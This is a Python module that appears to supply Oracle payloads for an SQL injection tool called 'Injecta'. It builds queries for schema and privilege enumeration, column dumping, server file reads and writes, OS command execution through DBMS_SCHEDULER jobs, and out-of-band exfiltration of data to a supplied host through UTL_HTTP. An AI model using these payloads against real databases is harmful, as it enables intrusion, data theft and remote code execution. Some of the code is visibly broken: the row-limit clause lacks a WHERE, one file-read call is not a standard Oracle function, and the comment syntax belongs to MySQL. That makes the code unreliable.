"""
Injecta — Oracle payload provider
"""
from typing import List


class OraclePayloads:
    name = "oracle"
    comment = "--"
    inline_comment = "/*!*/"
    substitution_char = "s"

    @staticmethod
    def version() -> List[str]:
        return [
            "SELECT banner FROM v$version WHERE ROWNUM=1",
        ]

    @staticmethod
    def databases() -> List[str]:
        return [
            "SELECT LISTAGG(username, ',') WITHIN GROUP (ORDER BY username) FROM all_users",
        ]

    @staticmethod
    def tables(owner: str) -> List[str]:
        return [
            f"SELECT LISTAGG(table_name, ',') WITHIN GROUP (ORDER BY table_name) FROM all_tables WHERE owner='{owner.upper()}'",
        ]

    @staticmethod
    def columns(owner: str, table: str) -> List[str]:
        return [
            f"SELECT LISTAGG(column_name, ',') WITHIN GROUP (ORDER BY column_name) FROM all_tab_columns WHERE owner='{owner.upper()}' AND table_name='{table.upper()}'",
        ]

    @staticmethod
    def dump_column(owner: str, table: str, column: str, limit: int = 0) -> List[str]:
        q = f"SELECT {column} FROM {owner}.{table}"
        if limit > 0:
            q += f" AND ROWNUM <= {limit}"
        return [q]

    @staticmethod
    def current_user() -> List[str]:
        return ["SELECT USER FROM DUAL"]

    @staticmethod
    def current_db() -> List[str]:
        return ["SELECT SYS_CONTEXT('USERENV', 'DB_NAME') FROM DUAL"]

    @staticmethod
    def count_tables(owner: str) -> List[str]:
        return [f"SELECT COUNT(*) FROM all_tables WHERE owner='{owner.upper()}'"]

    @staticmethod
    def count_columns(owner: str, table: str) -> List[str]:
        return [f"SELECT COUNT(*) FROM all_tab_columns WHERE owner='{owner.upper()}' AND table_name='{table.upper()}'"]

    @staticmethod
    def count_rows(owner: str, table: str) -> List[str]:
        return [f"SELECT COUNT(*) FROM {owner}.{table}"]

    @staticmethod
    def banner() -> List[str]:
        return ["SELECT banner FROM v$version WHERE ROWNUM=1"]

    @staticmethod
    def is_dba() -> List[str]:
        return ["SELECT '1' FROM DUAL WHERE EXISTS (SELECT 1 FROM session_roles WHERE role='DBA')"]

    @staticmethod
    def is_admin() -> List[str]:
        return ["SELECT '1' FROM DUAL WHERE EXISTS (SELECT 1 FROM session_roles WHERE role='DBA')"]

    @staticmethod
    def privileges() -> List[str]:
        return ["SELECT * FROM session_privs"]

    @staticmethod
    def file_read(path: str) -> List[str]:
        return [
            f"SELECT UTL_FILE.GET_LINE(UTL_FILE.FOPEN('{path.rsplit('/',1)[0] if '/' in path else ''}', '{path.rsplit('/',1)[1] if '/' in path else path}', 'r'), 1) FROM DUAL",
            f"SELECT * FROM TABLE(UTL_FILE.READ_FILE('{path}'))",
        ]

    @staticmethod
    def file_write(path: str, content: str) -> List[str]:
        escaped = content.replace("'", "''")
        return [
            f"DECLARE f UTL_FILE.FILE_TYPE; BEGIN f := UTL_FILE.FOPEN('{path.rsplit('/',1)[0] if '/' in path else ''}', '{path.rsplit('/',1)[1] if '/' in path else path}', 'w'); UTL_FILE.PUT_LINE(f, '{escaped}'); UTL_FILE.FCLOSE(f); END;",
        ]

    @staticmethod
    def os_cmd(cmd: str) -> List[str]:
        return [
            f"DECLARE job NUMBER; BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'x', job_type=>'EXECUTABLE', job_action=>'{cmd}', enabled=>TRUE); END;",
        ]

    @staticmethod
    def oob_call(target: str, data: str) -> List[str]:
        return [
            f"SELECT UTL_HTTP.REQUEST('http://{target}/{data}') FROM DUAL",
        ]
